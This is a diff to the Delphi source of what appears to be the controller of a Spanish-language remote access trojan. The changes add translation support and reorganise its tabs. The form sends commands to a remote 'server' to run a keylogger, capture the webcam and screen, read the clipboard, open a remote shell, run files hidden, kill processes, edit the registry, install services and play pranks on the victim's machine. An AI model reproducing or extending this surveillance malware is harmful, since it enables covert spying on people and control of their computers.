@@ -6,24 +6,15 @@ uses
   Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, CommCtrl,
   Dialogs, ComCtrls, XPMan, ImgList, Menus, ExtCtrls, StdCtrls, Buttons, {ScktComp,} Jpeg,
    Spin, IdThreadMgr, IdThreadMgrDefault, IdAntiFreezeBase,
-  IdAntiFreeze, IdBaseComponent, IdComponent, IdTCPServer, ShellAPI,ActiveX;
+  IdAntiFreeze, IdBaseComponent, IdComponent, IdTCPServer, ShellAPI,ActiveX, gnugettext;
 
 type
   TFormControl = class(TForm)
     PageControl: TPageControl;
     TabInfo: TTabSheet;
-    TabProcesos: TTabSheet;
-    BtnRefrescarProcesos: TSpeedButton;
-    ListViewProcesos: TListView;
-    TabVentanas: TTabSheet;
-    BtnRefrescarVentanas: TSpeedButton;
-    ListViewVentanas: TListView;
+    TabManagers: TTabSheet;
     TabExtra: TTabSheet;
     TabFileManager: TTabSheet;
-    TabRegistro: TTabSheet;
-    BtnVerRegisto: TSpeedButton;
-    EditPathRegistro: TEdit;
-    TabScreencap: TTabSheet;
     DlgGuardar: TSaveDialog;
     PopupProcess: TPopupMenu;
     Cerrar1: TMenuItem;
@@ -58,7 +49,6 @@ type
     XPManifest: TXPManifest;
     StatusBar: TStatusBar;
     Enviarteclas1: TMenuItem;
-    TabWebcam: TTabSheet;
     TimerCaptureScreen: TTimer;
     Descargarfichero1: TMenuItem;
     N4:      TMenuItem;
@@ -71,87 +61,36 @@ type
     Eliminardescarga1: TMenuItem;
     Subirfichero1: TMenuItem;
     OpenDialogUpload: TOpenDialog;
-    TabShell: TTabSheet;
-    MemoShell: TMemo;
     PopupShell: TPopupMenu;
     Activar2: TMenuItem;
-    ComboBoxShellCommand: TComboBox;
     DlgFont: TFontDialog;
-    BtnCambiarFuenteShell: TSpeedButton;
-    BtnCambiarColorShell: TSpeedButton;
     DlgColors: TColorDialog;
     Desactivar2: TMenuItem;
     N5:      TMenuItem;
     Guardarcmo1: TMenuItem;
-    TabServicios: TTabSheet;
-    ListViewServicios: TListView;
-    BtnServicios: TSpeedButton;
     PopupServicios: TPopupMenu;
     Iniciar1: TMenuItem;
     DEtener1: TMenuItem;
     Desinstalar1: TMenuItem;
     Instalar1: TMenuItem;
-    MultiEditInstalarServicio: TEdit;
-    btnSiguienteInstalarServicio: TSpeedButton;
-    BtnCancelarInstalarServicio: TSpeedButton;
-    btnInstServicios: TSpeedButton;
-    btnInstServicios2: TSpeedButton;
     DetenerDescarga1: TMenuItem;
     ReanudarDescarga1: TMenuItem;
     Agregaracoladedescarga1: TMenuItem;
-    btnGuardarImagen: TSpeedButton;
-    LabelPosicionCompresJpg: TLabel;
-    LabelCalidadCapScreen: TLabel;
-    BtnCapturarScreen: TSpeedButton;
-    BtnVerGrandeCap: TSpeedButton;
-    ProgressBarScreen: TProgressBar;
-    TrackBarCalidad: TTrackBar;
-    CheckBoxMouseClicks: TCheckBox;
-    ScrollBoxCapScreenM: TScrollBox;
-    imgCaptura: TImage;
-    CheckBoxAutoCapturaScreen: TCheckBox;
-    SpinCaptureScreen: TSpinEdit;
-    ProgressBarWebcam: TProgressBar;
-    ComboBoxWebcam: TComboBox;
-    TrackBarCalidadWebcam: TTrackBar;
-    LabelPosicionCompresJpgWebcam: TLabel;
-    LabelCalidadWebcam: TLabel;
-    BtnCapturarWebcam: TSpeedButton;
-    BtnGuardarWebcam: TSpeedButton;
-    BtnObtenerWebcams: TSpeedButton;
     N6:      TMenuItem;
     N7:      TMenuItem;
     Iralproceso1: TMenuItem;
     Previsualizarjpg1: TMenuItem;
     TimerCamCapture: TTimer;
-    CheckBoxAutoCamCapture: TCheckBox;
-    SpinCam: TSpinEdit;
-    CheckBoxMostrarVentanasOcultas: TCheckBox;
     PopupGuardarPantallaoWebcam: TPopupMenu;
     Guardarimagen1: TMenuItem;
     Guardadoautomtico1: TMenuItem;
-    TabKeylogger: TTabSheet;
-    RichEditKeylogger: TRichEdit;
     IconsArchivos: TImageList;
-    SpeedButtonRecibirLog: TSpeedButton;
-    SpeedButtonEliminarLog: TSpeedButton;
-    SpeedButtonGuardarLog: TSpeedButton;
-    SpeedButtonActivarKeylogger: TSpeedButton;
-    EditLogName: TEdit;
-    ProgressBarKeylogger: TProgressBar;
     N9: TMenuItem;
     Abrircarpetadescargas1: TMenuItem;
-    CheckBoxOnlineKeylogger: TCheckBox;
     PrevisualizarImagenes1: TMenuItem;
-    PanelRegistro: TPanel;
-    TreeViewRegedit: TTreeView;
-    ListViewRegistro: TListView;
-    Splitter1: TSplitter;
     Portapapeles1: TMenuItem;
     Copiar1: TMenuItem;
     Pegar1: TMenuItem;
-    CheckBoxTamanioReal: TCheckBox;
-    LabelTamano: TLabel;
     N8: TMenuItem;
     BuscarArchivos1: TMenuItem;
     CambiarAtributos1: TMenuItem;
@@ -217,8 +156,77 @@ type
     SpeedButtonBuscar: TSpeedButton;
     LabelNumeroEncontrados: TLabel;
     Abrirdirectorio1: TMenuItem;
+    PageControlManagers: TPageControl;
+    TabProcesos: TTabSheet;
+    ListViewProcesos: TListView;
+    BtnRefrescarProcesos: TSpeedButton;
+    TabVentanas: TTabSheet;
+    ListViewVentanas: TListView;
+    CheckBoxMostrarVentanasOcultas: TCheckBox;
+    BtnRefrescarVentanas: TSpeedButton;
+    TabRegistro: TTabSheet;
+    PanelRegistro: TPanel;
+    Splitter1: TSplitter;
+    TreeViewRegedit: TTreeView;
+    ListViewRegistro: TListView;
+    EditPathRegistro: TEdit;
+    BtnVerRegisto: TSpeedButton;
+    TabServicios: TTabSheet;
+    ListViewServicios: TListView;
+    MultiEditInstalarServicio: TEdit;
+    btnInstServicios2: TSpeedButton;
+    BtnCancelarInstalarServicio: TSpeedButton;
+    BtnServicios: TSpeedButton;
+    btnInstServicios: TSpeedButton;
+    btnSiguienteInstalarServicio: TSpeedButton;
+    TabPortapapeles: TTabSheet;
+    MemoClipBoard: TMemo;
+    SpeedButtonClipBoard1: TSpeedButton;
+    SpeedButtonClipBoard2: TSpeedButton;
+    TabShell: TTabSheet;
+    MemoShell: TMemo;
+    ComboBoxShellCommand: TComboBox;
+    BtnCambiarFuenteShell: TSpeedButton;
+    BtnCambiarColorShell: TSpeedButton;
+    TabVigilancia: TTabSheet;
+    PageControlVigilancia: TPageControl;
+    TabScreencap: TTabSheet;
+    TabWebcam: TTabSheet;
+    TabKeylogger: TTabSheet;
+    ScrollBoxCapScreenM: TScrollBox;
+    imgCaptura: TImage;
+    ProgressBarScreen: TProgressBar;
+    LabelTamano: TLabel;
+    LabelCalidadCapScreen: TLabel;
+    TrackBarCalidad: TTrackBar;
+    BtnCapturarScreen: TSpeedButton;
+    CheckBoxAutoCapturaScreen: TCheckBox;
+    SpinCaptureScreen: TSpinEdit;
+    btnGuardarImagen: TSpeedButton;
+    BtnVerGrandeCap: TSpeedButton;
+    LabelPosicionCompresJpg: TLabel;
+    CheckBoxMouseClicks: TCheckBox;
+    CheckBoxTamanioReal: TCheckBox;
     ScrollBoxCapWebcam: TScrollBox;
     ImgWebcam: TImage;
+    ProgressBarWebcam: TProgressBar;
+    ComboBoxWebcam: TComboBox;
+    LabelCalidadWebcam: TLabel;
+    CheckBoxAutoCamCapture: TCheckBox;
+    SpinCam: TSpinEdit;
+    BtnCapturarWebcam: TSpeedButton;
+    TrackBarCalidadWebcam: TTrackBar;
+    BtnGuardarWebcam: TSpeedButton;
+    BtnObtenerWebcams: TSpeedButton;
+    LabelPosicionCompresJpgWebcam: TLabel;
+    RichEditKeylogger: TRichEdit;
+    EditLogName: TEdit;
+    ProgressBarKeylogger: TProgressBar;
+    SpeedButtonRecibirLog: TSpeedButton;
+    SpeedButtonEliminarLog: TSpeedButton;
+    SpeedButtonGuardarLog: TSpeedButton;
+    CheckBoxOnlineKeylogger: TCheckBox;
+    SpeedButtonActivarKeylogger: TSpeedButton;
     procedure FormCreate(Sender: TObject);
     procedure BtnRefrescarProcesosClick(Sender: TObject);
     procedure BtnRefrescarVentanasClick(Sender: TObject);
@@ -365,7 +373,6 @@ type
     procedure TabSheetTransferenciasShow(Sender: TObject);
     procedure TabSheetServidorShow(Sender: TObject);
     procedure TabSheetInfoSistemaShow(Sender: TObject);
-    procedure TabProcesosShow(Sender: TObject);
     procedure TabSheetVerArchivosShow(Sender: TObject);
     procedure Refrescar1Click(Sender: TObject);
     procedure SpeedButtonBuscarClick(Sender: TObject);
@@ -375,6 +382,9 @@ type
     procedure Abrirdirectorio1Click(Sender: TObject);
     procedure FormShortCut(var Msg: TWMKey; var Handled: Boolean);
     procedure TabSheetBuscarShow(Sender: TObject);
+    procedure SpeedButtonClipBoard1Click(Sender: TObject);
+    procedure SpeedButtonClipBoard2Click(Sender: TObject);
+    procedure TabProcesosShow(Sender: TObject);
 
   private  //Funciones y variables privadas que solo podemos usar en este Form
     Servidor: TIdPeerThread;
@@ -391,6 +401,7 @@ type
     ReceivingThumbfile : boolean;
     IconosGrandes : TImageList;
     NumeroIconos : integer;
+    MSGPosibles : array of string;
     function ObtenerRutaAbsolutaDeArbol(Nodo: TTreeNode): string;
     procedure AniadirClavesARegistro(Claves: string);
     procedure AniadirValoresARegistro(Valores: string);
@@ -453,6 +464,66 @@ end;
 
 procedure TFormControl.FormCreate(Sender: TObject);
 begin
+    UseLanguage(Formmain.idioma);
+    TranslateComponent(self);
+      SetLength(MSGPosibles, 55);
+      MSGPosibles[0] := _('De momento no funciona esta función :-)');
+      MSGPosibles[1] := _('Hubo un problema al intentar auto-ejecutarse); la actualización se completara en el siguiente reinicio');
+      MSGPosibles[2] := _('Proceso matado con PID ');
+      MSGPosibles[3] := _(' :( No pude matar el proceso con PID ');
+      MSGPosibles[4] := _('Ventana cerrada con Handle ');
+      MSGPosibles[5] := _('Ventana maximizada con Handle ');
+      MSGPosibles[6] := _('Ventana minimizada con Handle ');
+      MSGPosibles[7] := _('Ventana mostrada con Handle ');
+      MSGPosibles[8] := _('Ventana ocultada con Handle ');
+      MSGPosibles[9] := _('Minimizadas todas las ventanas.');
+      MSGPosibles[10] := _('Se activó el botón Cerrar [X] en la ventana con Handle ');
+      MSGPosibles[11] := _('Se desactivó el botón Cerrar [X] en la ventana con Handle ');
+      MSGPosibles[12] := _('No se pudieron enviar las teclas a la ventana con handle ');
+      MSGPosibles[13] := _('Se enviaron las teclas a la ventana con handle ');
+      MSGPosibles[14] := _('El usuario respondió: OK');
+      MSGPosibles[15] := _('El usuario respondió: Cancelar');
+      MSGPosibles[16] := _('El usuario respondió: Reintentar');
+      MSGPosibles[17] := _('El usuario respondió: Sí');
+      MSGPosibles[18] := _('El usuario respondió: No');
+      MSGPosibles[19] := _('El usuario respondió: Anular');
+      MSGPosibles[20] := _('El usuario respondió: Omitir');
+      MSGPosibles[21] := _('Archivo correctamente ejecutado :).');
+      MSGPosibles[22] := _('Se produjo algún error al ejecutar el archivo.');
+      MSGPosibles[23] := _('Archivo correctamente ejecutado de manera oculta :).');
+      MSGPosibles[24] := _('Se produjo algún error al ejecutar el archivo de manera oculta.');
+      MSGPosibles[25] := _('El archivo fue borrado con éxito.');
+      MSGPosibles[26] := _('El archivo no se pudo borrar.');
+      MSGPosibles[27] := _('El archivo no existe. Tal vez ya fue borrado.');
+      MSGPosibles[28] := _('La carpeta fue borrada con éxito.');
+      MSGPosibles[29] := _('No se pudo borrar la carpeta.');
+      MSGPosibles[30] := _('La carpeta no existe. Tal vez ya fue borrada.');
+      MSGPosibles[31] := _('Archivo o carpeta renombrada con éxito.');
+      MSGPosibles[32] := _('No se pudo renombrar el archivo o la carpeta.');
+      MSGPosibles[33] := _('El archivo o la carpeta no existe.');
+      MSGPosibles[34] := _('Carpeta creada con éxito.');
+      MSGPosibles[35] := _('No se pudo crear la carpeta.');
+      MSGPosibles[36] := _('La carpeta ya existe); no es necesario crearla.');
+      MSGPosibles[37] := _('Archivo copiado con éxito');
+      MSGPosibles[38] := _('Error al copiar el archivo');
+      MSGPosibles[39] := _('Modificado nombre de clave con éxito.');
+      MSGPosibles[40] := _('Error al modificar el nombre de la clave.');
+      MSGPosibles[41] := _('Clave o Valor eliminado con éxito.');
+      MSGPosibles[42] := _('No se pudo eliminar la clave o el valor.');
+      MSGPosibles[43] := _('Clave añadida con éxito.');
+      MSGPosibles[44] := _('No se pudo añadir la clave.');
+      MSGPosibles[45] := _('Valor añadido con éxito.');
+      MSGPosibles[46] := _('No se pudo añadir el valor.');
+      MSGPosibles[47] := _('Se ha intentado iniciar el servicio');
+      MSGPosibles[48] := _('Se ha intentado detener el servicio');
+      MSGPosibles[49] := _('Se ha intentado desinstalar el servicio');
+      MSGPosibles[50] := _('Se ha intentado instalar el servicio');
+      MSGPosibles[51] := _('Log eliminado con éxito');
+      MSGPosibles[52] := _('Online Keylogger activado con éxito');
+      MSGPosibles[53] := _('Online Keylogger desactivado con éxito');
+      MSGPosibles[54] := _('Seteado portapapeles con éxito');
+      
+
     self.DoubleBuffered := True;  //Evita parpadeos
     recibiendofichero := false;
     CargarIconos(true);
@@ -466,6 +537,8 @@ begin
     PageControl.ActivePage := TabInfo; //iniciamos siempre en este tab
     PageControlInformacion.ActivePage := TabSheetServidor;
     PageControlArchivos.ActivePage := TabSheetVerArchivos;
+    PageControlManagers.ActivePage := TabProcesos;
+    PageControlVigilancia.ActivePage := TabScreencap;
 end;
 
 procedure TFormControl.Cargariconos(primeravez : boolean);
@@ -671,11 +744,11 @@ begin
 
       
       case strtointdef(Copy(Recibido, 1, Pos('|', Recibido) - 1),4) of
-      0: begin item.ImageIndex := 65; Item.SubItems.Add('Oculta'); end;
-      1: begin item.ImageIndex := 61; Item.SubItems.Add('Maximizada'); end;
-      2: begin item.ImageIndex := 66; Item.SubItems.Add('Normal'); end;
-      3: begin item.ImageIndex := 64; Item.SubItems.Add('Minimizada'); end;
-      4: begin item.ImageIndex := 66; Item.SubItems.Add('Activa'); end;
+      0: begin item.ImageIndex := 65; Item.SubItems.Add(_('Oculta')); end;
+      1: begin item.ImageIndex := 61; Item.SubItems.Add(_('Maximizada')); end;
+      2: begin item.ImageIndex := 66; Item.SubItems.Add(_('Normal')); end;
+      3: begin item.ImageIndex := 64; Item.SubItems.Add(_('Minimizada')); end;
+      4: begin item.ImageIndex := 66; Item.SubItems.Add(_('Activa')); end;
       end;
 
       Delete(Recibido, 1, Pos('|', Recibido));
@@ -696,14 +769,14 @@ begin
     Delete(Recibido, 1, Pos('|', Recibido));
     if ListViewProcesos.Items.Count <= 0 then
       MessageBox(Handle,
-        'No se encontró ningún proceso listado. Debes actualizar la lista de procesos.',
+        pchar(_('No se encontró ningún proceso listado. Debes actualizar la lista de procesos.')),
         'Error', MB_ICONERROR + MB_OK);
     if Recibido = '0' then
     begin
       MessageBox(Handle,
-        'No se encontró ningún proceso para la ventana. Es posible que el proceso ya haya sido cerrado.'
+        pchar(_('No se encontró ningún proceso para la ventana. Es posible que el proceso ya haya sido cerrado.')
         +
-        #13#10 + 'Actualice la lista de ventanas.', 'Error', MB_ICONERROR + MB_OK);
+        #13#10 + _('Actualice la lista de ventanas.')), 'Error', MB_ICONERROR + MB_OK);
     end
     else
       for i := 0 to ListViewProcesos.Items.Count - 1 do
@@ -711,8 +784,8 @@ begin
         if ListViewProcesos.Items[i].SubItems[0] = Recibido then
         begin
           StatusBar.Panels[1].Text :=
-            'La ventana con handle ' + TempStr + ' pertenece al proceso "' +
-            ListViewProcesos.Items[i].Caption + '" con PID ' + Recibido + '.';
+            _('La ventana con handle ') + TempStr + _(' pertenece al proceso "') +
+            ListViewProcesos.Items[i].Caption + _('" con PID ') + Recibido + '.';
           ListViewProcesos.Items[i].MakeVisible({PartialVisible->}False);
           //Falso para asegurarse que se vea completamente el item
           PageControl.ActivePageIndex := TabProcesos.TabIndex;
@@ -730,7 +803,10 @@ begin
   if Copy(Recibido, 1, 3) = 'MSG' then
   begin
     Delete(Recibido, 1, 4);
-    if Recibido = 'El directorio no existe!' then
+    for i := 0 to 54 do
+      Recibido := StringReplace(Recibido,'{'+inttostr(i)+'}',MSGPosibles[i],[rfReplaceAll]);
+
+    if Recibido = _('El directorio no existe!') then
     begin
       EditPathArchivos.Text :=
         Copy(EditPathArchivos.Text, 1, Length(EditPathArchivos.Text) - 1); //Borra el ultimo '\'
@@ -776,7 +852,7 @@ begin
       TempStr := TempStr + ' ' + Copy(Recibido, 1, (Pos('|', Recibido) - 1));  //Nombre
       Delete(Recibido, 1, Pos('|', Recibido));
 
-      TempStr := TempStr + ' - Espacio libre/total: ' +
+      TempStr := TempStr + ' - '+_('Espacio libre/total: ') +
         ObtenerMejorUnidad(StrToInt64(Copy(Recibido, 1, (Pos('|', Recibido) - 1))));
       //Espacio disponible
       Delete(Recibido, 1, Pos('|', Recibido));
@@ -784,16 +860,16 @@ begin
         ObtenerMejorUnidad(StrToInt64(Copy(Recibido, 1, (Pos('|', Recibido) - 1))));
       //Espacio total
       Delete(Recibido, 1, Pos('|', Recibido));
-      TempStr := TempStr + ' - Formato: ' + Copy(Recibido, 1, (Pos('|', Recibido) - 1));
+      TempStr := TempStr + ' - '+_('Formato:')+' ' + Copy(Recibido, 1, (Pos('|', Recibido) - 1));
       //Formato
       Delete(Recibido, 1, Pos('|', Recibido));
       case StrToInt(Copy(Recibido, 1, (Pos('|', Recibido) - 1))) of //el último caracter
-        0: TempStr := TempStr + ' - Unidad desconocida';
-        2: TempStr := TempStr + ' - Unidad removible';
-        3: TempStr := TempStr + ' - Disco duro';
-        4: TempStr := TempStr + ' - Disco de red';
-        5: TempStr := TempStr + ' - Unidad de CD/DVD';
-        6: TempStr := TempStr + ' - Disc RAM';
+        0: TempStr := TempStr + _(' - Unidad desconocida');
+        2: TempStr := TempStr + _(' - Unidad removible');
+        3: TempStr := TempStr + _(' - Disco duro');
+        4: TempStr := TempStr + _(' - Disco de red');
+        5: TempStr := TempStr + _(' - Unidad de CD/DVD');
+        6: TempStr := TempStr + _(' - Disc RAM');
       end;
       cmbUnidades.Items.Add(TempStr);
       Delete(Recibido, 1, Pos('|', Recibido));
@@ -801,7 +877,7 @@ begin
     cmbUnidades.Enabled      := True;
     EditPathArchivos.Enabled := True;
     BtnActualizarArchivos.Enabled := True;
-    StatusBar.Panels[1].Text := 'Unidades listadas.';
+    StatusBar.Panels[1].Text := _('Unidades listadas.');
     BtnVerUnidades.Enabled := True;
   end;
 
@@ -842,7 +918,7 @@ begin
         Delete(TempStr, 1, Pos(':', Tempstr));
 
         Item.SubItems.Add('');
-        Item.SubItems.Add('Carpeta de archivos');
+        Item.SubItems.Add(_('Carpeta de archivos'));
         Item.SubItems.Add(Copy(TempStr, 1, Pos(':', TempStr) - 1));
         Item.SubItems.Add(Copy(TempStr, Pos(':', TempStr) + 1, Length(TempStr)));
       end
@@ -883,7 +959,7 @@ begin
         if ListViewArchivos.Items[i].ImageIndex = 3 then
           a := a + 1;
       end;
-      LabelNumeroDeCarpetas.Caption := 'Carpetas: ' + IntToStr(a);
+      LabelNumeroDeCarpetas.Caption := _('Carpetas: ') + IntToStr(a);
       //Aquí cuenta los archivos para decir cuantos son
       a := 0;
       for i := 0 to ListViewArchivos.Items.Count - 1 do
@@ -891,7 +967,7 @@ begin
         if (ListViewArchivos.Items[i].ImageIndex <> 3) then //si no es una carpeta...
           a := a + 1;
       end;
-      LabelNumeroDeArchivos.Caption := 'Archivos: ' + IntToStr(a);
+      LabelNumeroDeArchivos.Caption := _('Archivos: ') + IntToStr(a);
     end;
     if PrevisualizacionActiva then
       cargariconos(false);
@@ -943,7 +1019,7 @@ begin
       ComboBoxWebcam.Items.Append(Copy(Recibido, 1, Pos('|', Recibido) - 1));
       Delete(Recibido, 1, Pos('|', Recibido));
     end;
-    StatusBar.Panels[1].Text := 'Webcams listadas.';
+    StatusBar.Panels[1].Text := _('Webcams listadas.');
   end;
 
   if Pos('SHELL|', Recibido) = 1 then
@@ -996,13 +1072,13 @@ begin
       Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
       Delete(Recibido, 1, Pos('|', Recibido));
       Item.SubItems.Add(copy(recibido, 1, pos('|', Recibido) - 1));
-      if(copy(recibido, 1, pos('|', Recibido) - 1) = 'Parado') then
+      if(copy(recibido, 1, pos('|', Recibido) - 1) = _('Parado')) then
         item.ImageIndex := 69
       else
-      if(copy(recibido, 1, pos('|', Recibido) - 1) = 'Corriendo') then
+      if(copy(recibido, 1, pos('|', Recibido) - 1) = _('Corriendo')) then
         item.ImageIndex := 71
       else
-      if(copy(recibido, 1, pos('|', Recibido) - 1) = 'pausado') then
+      if(copy(recibido, 1, pos('|', Recibido) - 1) = _('Pausado')) then
         item.ImageIndex := 70
       else
         item.ImageIndex := 45;
@@ -1025,7 +1101,7 @@ begin
       SpeedButtonEliminarLog.Enabled := true;
       ProgressBarKeylogger.Enabled := true;
       EditLogName.Enabled := false;
-      SpeedButtonActivarKeylogger.caption := 'Desactivar Keylogger';
+      SpeedButtonActivarKeylogger.caption := _('Desactivar Keylogger');
       SpeedButtonActivarKeylogger.enabled := true;
       CheckBoxOnlineKeylogger.enabled := true;
     end
@@ -1036,7 +1112,7 @@ begin
       SpeedButtonEliminarLog.Enabled := false;
       ProgressBarKeylogger.Enabled := false;
       EditLogName.Enabled := true;
-      SpeedButtonActivarKeylogger.caption := 'Activar Keylogger';
+      SpeedButtonActivarKeylogger.caption := _('Activar Keylogger');
       SpeedButtonActivarKeylogger.enabled := true;
       CheckBoxOnlineKeylogger.enabled := false;
     end;
@@ -1093,15 +1169,15 @@ begin
     if copy(Recibido,1,5) = 'STOPS' then     //Paramos...
     begin
       TabSheetBuscar.highlighted := false;
-      SpeedButtonBuscar.caption := 'Comenzar';
+      SpeedButtonBuscar.caption := _('Comenzar');
       EditBuscar.Enabled := true;
-      StatusBar.panels[1].text := 'Busqueda parada';
+      StatusBar.panels[1].text := _('Busqueda parada');
     end
     else if  copy(Recibido,1,6) = 'FINISH' then //Terminado!
     begin
-      SpeedButtonBuscar.caption := 'Comenzar';
+      SpeedButtonBuscar.caption := _('Comenzar');
       EditBuscar.Enabled := true;
-      StatusBar.panels[1].text := 'Busqueda finalizada';
+      StatusBar.panels[1].text := _('Busqueda finalizada');
       TabSheetBuscar.highlighted := false; 
     end
     else
@@ -1122,7 +1198,8 @@ begin
         delete(Recibido,1,pos('|',Recibido));
         Item.SubItems.Add(RealSize);
       end;//fin while
-      LabelNumeroEncontrados.Caption := 'Encontrados: '+inttostr(ListViewBuscar.items.count);
+      
+      LabelNumeroEncontrados.Caption := _('Encontrados: ')+inttostr(ListViewBuscar.items.count);
    end;
   end;
 
@@ -1132,6 +1209,15 @@ begin
     EditPathArchivos.Text := copy(Recibido, 1, pos('|', Recibido) - 1);
     BtnActualizarArchivos.Click;
   end;
+
+  // Portapapeles!
+  If Copy(Recibido,1,7) = 'GETCLIP' then
+  begin
+       Delete(Recibido,1,8);
+       MemoClipBoard.Text:= Recibido;
+  end;
+
+// se fini del dispacher de comandos
 end;
 
 function TFormControl.IconNum(strExt: string): integer;
@@ -1187,7 +1273,7 @@ begin
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('INFO')
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 //Boton obtener procesos
@@ -1198,7 +1284,7 @@ begin
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('PROC')
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 //Item del popupmenu para cerrar un proceso
@@ -1209,7 +1295,7 @@ begin
   if Servidor.Connection.Connected then
   begin
     if mslistviewitem = nil then
-      MessageDlg('Selecciona algún proceso para matar', mtWarning, [mbOK], 0)
+      MessageDlg(_('Selecciona algún proceso para matar'), mtWarning, [mbOK], 0)
     else
     begin
 
@@ -1222,7 +1308,7 @@ begin
     end
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 
 
 
@@ -1243,7 +1329,7 @@ begin
       Servidor.Connection.Writeln('WIND|false|');
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 //Item del popupmenu para cerrar una ventana
@@ -1254,7 +1340,7 @@ begin
   if Servidor.Connection.Connected then
   begin
     if mslistviewitem = nil then
-      MessageDlg('Selecciona alguna ventana', mtWarning, [mbOK], 0)
+      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
     else
     begin
       while Assigned(mslistviewitem) do
@@ -1265,7 +1351,7 @@ begin
       end;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 //Item del popupmenu para maximizar una ventana
@@ -1276,7 +1362,7 @@ mslistviewitem := ListViewVentanas.Selected;
   if Servidor.Connection.Connected then
   begin
     if mslistviewitem = nil then
-      MessageDlg('Selecciona alguna ventana', mtWarning, [mbOK], 0)
+      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
     else
     begin
       while Assigned(mslistviewitem) do
@@ -1287,7 +1373,7 @@ mslistviewitem := ListViewVentanas.Selected;
       end;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 
 end;
 
@@ -1299,7 +1385,7 @@ mslistviewitem := ListViewVentanas.Selected;
   if Servidor.Connection.Connected then
   begin
     if mslistviewitem = nil then
-      MessageDlg('Selecciona alguna ventana', mtWarning, [mbOK], 0)
+      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
     else
     begin
       while Assigned(mslistviewitem) do
@@ -1310,7 +1396,7 @@ mslistviewitem := ListViewVentanas.Selected;
       end;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 //Item del popupmenu para mostrar una ventana
@@ -1321,7 +1407,7 @@ mslistviewitem := ListViewVentanas.Selected;
   if Servidor.Connection.Connected then
   begin
     if mslistviewitem = nil then
-      MessageDlg('Selecciona alguna ventana', mtWarning, [mbOK], 0)
+      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
     else
     begin
       while Assigned(mslistviewitem) do
@@ -1332,7 +1418,7 @@ mslistviewitem := ListViewVentanas.Selected;
       end;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 //Item del popupmenu para ocultar una ventana
@@ -1343,7 +1429,7 @@ mslistviewitem := ListViewVentanas.Selected;
   if Servidor.Connection.Connected then
   begin
     if mslistviewitem = nil then
-      MessageDlg('Selecciona alguna ventana', mtWarning, [mbOK], 0)
+      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
     else
     begin
       while Assigned(mslistviewitem) do
@@ -1354,7 +1440,7 @@ mslistviewitem := ListViewVentanas.Selected;
       end;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 //Item del popupmenu para minimizar todas las ventanas
@@ -1363,7 +1449,7 @@ begin
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('MINALLWIN')
   else
-    MessageDlg('No estás conectado !', mtWarning, [mbOK], 0);
+    MessageDlg(Pchar(_('No estás conectado!')), mtWarning, [mbOK], 0);
 end;
 
 //Activar Botón cerrar [X] de una ventana
@@ -1374,7 +1460,7 @@ mslistviewitem := ListViewVentanas.Selected;
   if Servidor.Connection.Connected then
   begin
     if mslistviewitem = nil then
-      MessageDlg('Selecciona alguna ventana', mtWarning, [mbOK], 0)
+      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
     else
     begin
       while Assigned(mslistviewitem) do
@@ -1385,7 +1471,7 @@ mslistviewitem := ListViewVentanas.Selected;
       end;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 //Desactivar Botón cerrar [X] de una ventana
@@ -1396,7 +1482,7 @@ mslistviewitem := ListViewVentanas.Selected;
   if Servidor.Connection.Connected then
   begin
     if mslistviewitem = nil then
-      MessageDlg('Selecciona alguna ventana', mtWarning, [mbOK], 0)
+      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
     else
     begin
       while Assigned(mslistviewitem) do
@@ -1407,7 +1493,7 @@ mslistviewitem := ListViewVentanas.Selected;
       end;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 
@@ -1418,7 +1504,7 @@ begin
   if Servidor.Connection.Connected then
   begin
     if ListViewBromas.Selected = nil then
-      MessageDlg('Selecciona alguna broma', mtWarning, [mbOK], 0)
+      MessageDlg(_('Selecciona alguna broma'), mtWarning, [mbOK], 0)
     else
     begin
       case ListViewBromas.Selected.Index of //Selecciona la broma que se va a enviar
@@ -1427,14 +1513,14 @@ begin
         2: Broma := 'ABRIRCD';
         3: Broma := 'MATARBOTONINICIO';
       end;
-      if ListViewBromas.Selected.SubItems[0] = 'Desactivado' then
+      if ListViewBromas.Selected.SubItems[0] = _('Desactivado') then
       begin
         Servidor.Connection.Writeln(Broma + '|ACTIVAR');
